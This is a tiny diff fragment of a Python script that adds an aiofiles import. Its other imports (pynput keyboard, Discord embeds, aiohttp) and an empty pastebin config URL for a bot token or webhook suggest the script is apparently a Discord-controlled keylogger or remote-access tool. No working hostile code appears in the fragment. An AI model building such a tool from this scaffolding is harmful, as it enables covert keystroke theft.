@@ -29,6 +29,7 @@ from discord import File, Embed
 from datetime import datetime
 from pynput import keyboard
 import pyttsx3
+import aiofiles
 import aiohttp
 # Bot Token/Webhook Setup 
 config_url = ""  # Replace with your pastebin link with bot token/webhook
